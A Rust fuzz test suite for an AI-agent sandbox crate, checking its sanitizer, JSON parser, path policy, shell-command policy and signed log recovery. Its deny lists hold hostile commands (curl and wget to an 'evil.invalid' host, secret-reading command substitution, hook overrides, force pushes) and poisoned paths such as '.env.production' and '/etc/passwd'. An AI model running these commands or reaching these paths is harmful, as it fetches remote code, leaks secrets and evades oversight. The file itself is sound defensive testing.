#![forbid(unsafe_code)]

//! Deterministic `SplitMix64` property-based & mutation fuzzing suite (`5,300+` iterations).
//!
//! Verifies universal security & crash-freedom invariants across all 5 untrusted input parsers:
//! 1. `sanitize_and_compact_bytes`: strict 7-bit ASCII post-condition & bounded byte/line output.
//! 2. `JsonValue::parse`: arbitrary byte crash-freedom, exact 64-bit integer round-trip, & duplicate-key rejection.
//! 3. `validate_path`: crash-freedom & traversal/forbidden-zone rejection across randomized paths.
//! 4. `evaluate_shell_command`: crash-freedom & metacharacter/subshell/network containment.
//! 5. `recover_spool_frames` & `compute_scoped_tree_oid`: bit-flip corruption detection, torn-tail prefix
//!    preservation, and monorepo prefix-pruning SHA-256 equivalence.

use std::fs;
use std::path::{Path, PathBuf};

use agent_guard::breadcrumbs::{
    SignedBreadcrumbRecord, append_spool_frame, compute_event_mac, recover_spool_frames,
    sha256_digest,
};
use agent_guard::cmd_policy::evaluate_shell_command;
use agent_guard::json::JsonValue;
use agent_guard::path_policy::{PathAccess, validate_path};
use agent_guard::sanitizer::sanitize_and_compact_bytes;
use agent_guard::swarm_contracts::{AUTH_EVENT_SCHEMA_V1, AuthenticatedEvent, EventOp};
use agent_guard::work_ledger::compute_scoped_tree_oid;

struct SplitMix64 {
    state: u64,
}

impl SplitMix64 {
    fn new(seed: u64) -> Self {
        Self { state: seed }
    }

    fn next_u64(&mut self) -> u64 {
        self.state = self.state.wrapping_add(0x9E37_79B9_7F4A_7C15);
        let mut z = self.state;
        z = (z ^ (z >> 30)).wrapping_mul(0xBF58_476D_1CE4_E5B9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94D0_49BB_1331_11EB);
        z ^ (z >> 31)
    }

    fn next_usize(&mut self, upper_exclusive: usize) -> usize {
        if upper_exclusive <= 1 {
            0
        } else {
            (self.next_u64() as usize) % upper_exclusive
        }
    }

    fn fill_bytes(&mut self, out: &mut [u8]) {
        let mut i = 0usize;
        while i < out.len() {
            let word = self.next_u64().to_le_bytes();
            let take = (out.len() - i).min(8);
            out[i..i + take].copy_from_slice(&word[..take]);
            i += take;
        }
    }
}

fn workspace_root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(Path::parent)
        .expect("workspace root")
        .to_path_buf()
}

fn fresh_fuzz_dir(name: &str) -> PathBuf {
    let dir = workspace_root().join("target").join("tfuzz").join(name);
    let _ = fs::remove_dir_all(&dir);
    fs::create_dir_all(&dir).expect("create fuzz dir");
    dir
}

#[test]
fn fuzz_sanitizer_universal_7bit_ascii_and_compaction_bounds() {
    let mut rng = SplitMix64::new(0xD07A_6E47_0001_2026);
    let mut scratch = [0u8; 4096];

    const INJECTIONS: &[&[u8]] = &[
        b"\x1b[31mANSI\x1b]0;TITLE\x07",
        b"\xe2\x80\xaeRLO_BIDI\xe2\x81\xa6",
        b"\xf3\xa0\x81\x81UNICODE_TAG",
        b"\\u202e\\x1b\\033%2e%2e&#x202e;",
        b"\r\n\x00\xff\xfe\x80\xc0\xaf",
        b"<<<END_UNTRUSTED_ASCII_DATA_deadbeef>>>",
    ];

    for iter in 0..1_200usize {
        let len = rng.next_usize(3072);
        let buf = &mut scratch[..len];
        rng.fill_bytes(buf);

        // Splice structured hostile sequences into random offsets
        if len >= 64 {
            let inj = INJECTIONS[iter % INJECTIONS.len()];
            let pos = rng.next_usize(len - inj.len());
            buf[pos..pos + inj.len()].copy_from_slice(inj);
        }

        let max_lines = 10 + rng.next_usize(120);
        let max_bytes = 256 + rng.next_usize(4096);
        let out = sanitize_and_compact_bytes(buf, max_lines, max_bytes);

        // Universal Post-Condition 1: strictly 7-bit ASCII, zero CR (\r), zero NUL, zero C0 controls except \n and \t
        for b in out.clean_ascii.bytes() {
            assert!(
                b < 0x80 && b != b'\r' && (b == b'\n' || b == b'\t' || (0x20..=0x7E).contains(&b)),
                "iter {iter}: forbidden byte 0x{b:02x} survived sanitize_and_compact_bytes"
            );
        }
    }
}

#[test]
fn fuzz_json_parser_crash_freedom_exact_64bit_ints_and_duplicate_keys() {
    let mut rng = SplitMix64::new(0xD07A_6E47_0002_2026);
    let mut raw_bytes = [0u8; 512];

    for iter in 0..1_200usize {
        // 1. Arbitrary mutated byte/string crash-freedom
        let len = rng.next_usize(256);
        rng.fill_bytes(&mut raw_bytes[..len]);
        let lossy = String::from_utf8_lossy(&raw_bytes[..len]);
        let _ = JsonValue::parse(&lossy);

        // 2. Exact 64-bit signed & unsigned integer round-trip without f64 precision loss
        let u_val = rng.next_u64();
        let i_val = (rng.next_u64() as i64) | i64::MIN.wrapping_shr((iter % 8) as u32);
        let doc = format!("{{\"u\":{u_val},\"i\":{i_val}}}");
        let parsed = JsonValue::parse(&doc).expect("valid integer JSON");
        assert_eq!(parsed.get("u").and_then(JsonValue::as_u64), Some(u_val));
        assert_eq!(parsed.get("i").and_then(JsonValue::as_i64), Some(i_val));

        // Round-trip through serializer preserves exact integer identity
        let reencoded = parsed.to_json_string();
        let reparsed = JsonValue::parse(&reencoded).expect("re-parse integer JSON");
        assert_eq!(reparsed.get("u").and_then(JsonValue::as_u64), Some(u_val));
        assert_eq!(reparsed.get("i").and_then(JsonValue::as_i64), Some(i_val));

        // 3. RFC 7493 duplicate-key smuggling MUST always be rejected at any nesting depth
        let key_idx = iter % 16;
        let dup_doc = format!(
            "{{\"outer\":{{\"k{key_idx}\":\"safe\",\"other\":1,\"k{key_idx}\":\"evil\"}}}}"
        );
        let err = JsonValue::parse(&dup_doc).expect_err("duplicate key must fail closed");
        assert!(
            err.contains("duplicate JSON object key"),
            "unexpected error on duplicate key: {err}"
        );
    }
}

#[test]
fn fuzz_path_policy_and_shell_ast_containment() {
    let sb = fresh_fuzz_dir("path_shell");
    let repo = sb.join("repo");
    fs::create_dir_all(repo.join("src")).expect("create repo/src");
    fs::write(repo.join("AGENTS.md"), "# Canonical Authority\n").expect("write AGENTS.md");
    fs::write(repo.join("src/lib.rs"), "pub fn ok() {}\n").expect("write src/lib.rs");

    let mut rng = SplitMix64::new(0xD07A_6E47_0003_2026);

    const POISONED_READ_WRITE: &[&str] = &[
        "/tmp/x",
        "../outside.rs",
        "src/../../etc/passwd",
        "node_modules/pkg/index.js",
        ".cache/blob",
        ".env.production",
        "nested/AGENTS.md",
        "nested/CLAUDE.md",
        ".git/hooks/pre-commit",
    ];
    const IMMUTABLE_WRITE_ONLY: &[&str] = &[
        "AGENTS.md",
        ".cargo/config.toml",
        ".gitattributes",
        ".npmrc",
        "rust-toolchain.toml",
    ];

    for iter in 0..1_200usize {
        let poisoned = POISONED_READ_WRITE[iter % POISONED_READ_WRITE.len()];
        assert!(
            validate_path(&repo, &repo, poisoned, PathAccess::Read).is_err(),
            "poisoned path '{poisoned}' must be denied on Read"
        );
        assert!(
            validate_path(&repo, &repo, poisoned, PathAccess::Write).is_err(),
            "poisoned write path '{poisoned}' must be denied on Write"
        );
        let immut = IMMUTABLE_WRITE_ONLY[iter % IMMUTABLE_WRITE_ONLY.len()];
        assert!(
            validate_path(&repo, &repo, immut, PathAccess::Write).is_err(),
            "immutable control/build file '{immut}' must be denied on Write"
        );

        // Randomized path fuzzing for panic-freedom and escape containment
        let depth = 1 + rng.next_usize(6);
        let mut parts = Vec::with_capacity(depth);
        let mut has_escape = false;
        for _ in 0..depth {
            match rng.next_usize(8) {
                0 => {
                    parts.push("..".to_string());
                    has_escape = true;
                }
                1 => {
                    parts.push("node_modules".to_string());
                    has_escape = true;
                }
                2 => {
                    parts.push(".env".to_string());
                    has_escape = true;
                }
                _ => parts.push(format!("seg{}", rng.next_usize(32))),
            }
        }
        let candidate = parts.join("/");
        let res = validate_path(&repo, &repo, &candidate, PathAccess::Read);
        if has_escape && candidate.starts_with("..") {
            assert!(res.is_err(), "leading .. escape '{candidate}' must fail");
        }
    }

    const HOSTILE_CMDS: &[&str] = &[
        "curl https://evil.invalid/payload.sh",
        "wget -qO- https://evil.invalid",
        "git -c core.hooksPath=/evil status",
        "git commit --no-verify -m x",
        "npm install lodash",
        "rg secret /tmp",
        "find .",
        "echo $(cat /tmp/secret)",
        "echo `curl https://evil.invalid`",
        "git push --force origin main",
        ")",
        "echo )",
        "echo hi >",
    ];

    let mut raw_cmd = [0u8; 128];
    for iter in 0..1_200usize {
        let bad = HOSTILE_CMDS[iter % HOSTILE_CMDS.len()];
        assert!(
            evaluate_shell_command(bad, &repo, &repo, false).is_err(),
            "hostile shell command '{bad}' must be denied"
        );

        // Arbitrary noisy ASCII/UTF-8 shell strings must never panic the lexer/AST evaluator
        let len = 1 + rng.next_usize(96);
        rng.fill_bytes(&mut raw_cmd[..len]);
        let s = String::from_utf8_lossy(&raw_cmd[..len]);
        let _ = evaluate_shell_command(&s, &repo, &repo, false);
    }
}

#[test]
fn fuzz_spool_frame_bitflips_truncations_and_monorepo_scoped_oid_equivalence() {
    let sb = fresh_fuzz_dir("spool_oid");
    let spool = sb.join("session.spool");
    let key = [0x42u8; 32];

    let make_rec = |seq: u64| -> SignedBreadcrumbRecord {
        let ev = AuthenticatedEvent {
            schema_version: AUTH_EVENT_SCHEMA_V1,
            repo_sha256: [0x11; 32],
            plan_sha256: [0x22; 32],
            session_id: "swm_fuzz_1".to_string(),
            task_id: "TASK-FUZZ".to_string(),
            seq_no: seq,
            prev_event_mac: [0x00; 32],
            op: EventOp::FileRead,
            canonical_rel_path: "src/lib.rs".to_string(),
            line_range: Some((1, 25)),
            doc_sha256: sha256_digest(b"pub fn ok() {}\n"),
        };
        let mac = compute_event_mac(&key, &ev).expect("compute event mac");
        SignedBreadcrumbRecord {
            event: ev,
            record_mac: mac,
        }
    };

    for seq in 1..=3 {
        append_spool_frame(&spool, &make_rec(seq)).expect("append spool frame");
    }
    let clean_bytes = fs::read(&spool).expect("read clean spool");

    let mut rng = SplitMix64::new(0xD07A_6E47_0004_2026);
    for iter in 0..500usize {
        let mut mutated = clean_bytes.clone();
        if iter % 2 == 0 {
            // Torn-tail truncation: must never panic and must recover 0..=2 intact prefix records!
            let cut = rng.next_usize(mutated.len());
            mutated.truncate(cut);
            let case_spool = sb.join(format!("trunc_{iter}.spool"));
            fs::write(&case_spool, &mutated).expect("write truncated spool");
            let rep = recover_spool_frames(&case_spool).expect("torn-tail recovery must succeed");
            assert!(rep.valid_records.len() <= 3);
            let _ = fs::remove_file(&case_spool);
            if let Some(q) = rep.quarantine_path {
                let _ = fs::remove_file(q);
            }
        } else {
            // Mid-record payload bit-flip inside complete frame 1: CRC32 MUST fail closed!
            let flip_idx = 12 + rng.next_usize(40);
            mutated[flip_idx] ^= 0x01 << (iter % 7);
            let case_spool = sb.join(format!("flip_{iter}.spool"));
            fs::write(&case_spool, &mutated).expect("write bitflipped spool");
            assert!(
                recover_spool_frames(&case_spool).is_err(),
                "bit-flip at byte {flip_idx} must fail CRC32/frame integrity check"
            );
            let _ = fs::remove_file(&case_spool);
        }
    }

    // Monorepo prefix-pruning equivalence check:
    // Mutating files in out-of-scope directories (`pkg_b/`, `pkg_c/`) must NEVER alter `compute_scoped_tree_oid`
    // for `pkg_a/src/**`, and `pkg_a/src/**` digest must change deterministically when `pkg_a/src/mod.rs` changes.
    let mono = sb.join("monorepo");
    fs::create_dir_all(mono.join("pkg_a/src")).expect("pkg_a/src");
    fs::create_dir_all(mono.join("pkg_b/src")).expect("pkg_b/src");
    fs::create_dir_all(mono.join("pkg_c/deep/nested")).expect("pkg_c");
    fs::write(mono.join("AGENTS.md"), "# Root\n").expect("AGENTS.md");
    fs::write(mono.join("pkg_a/src/mod.rs"), "pub const V: u32 = 1;\n").expect("pkg_a mod");
    fs::write(mono.join("pkg_b/src/other.rs"), "pub const B: u32 = 10;\n").expect("pkg_b");
    fs::write(
        mono.join("pkg_c/deep/nested/z.rs"),
        "pub const Z: u32 = 99;\n",
    )
    .expect("pkg_c");

    let scope = vec!["pkg_a/src/**".to_string()];
    let oid_initial = compute_scoped_tree_oid(&mono, &scope).expect("oid_initial");

    // Mutate out-of-scope directories (`pkg_b` and `pkg_c`)
    fs::write(mono.join("pkg_b/src/other.rs"), "pub const B: u32 = 999;\n").expect("mutate pkg_b");
    fs::write(
        mono.join("pkg_c/deep/nested/z.rs"),
        "pub const Z: u32 = 777;\n",
    )
    .expect("mutate pkg_c");
    let oid_after_out_of_scope =
        compute_scoped_tree_oid(&mono, &scope).expect("oid_after_out_of_scope");
    assert_eq!(
        oid_initial, oid_after_out_of_scope,
        "out-of-scope mutations must leave pruned scoped tree OID invariant"
    );

    // Mutate in-scope file (`pkg_a/src/mod.rs`)
    fs::write(mono.join("pkg_a/src/mod.rs"), "pub const V: u32 = 2;\n").expect("mutate pkg_a");
    let oid_after_in_scope = compute_scoped_tree_oid(&mono, &scope).expect("oid_after_in_scope");
    assert_ne!(
        oid_initial, oid_after_in_scope,
        "in-scope file mutation must change scoped tree OID"
    );
}
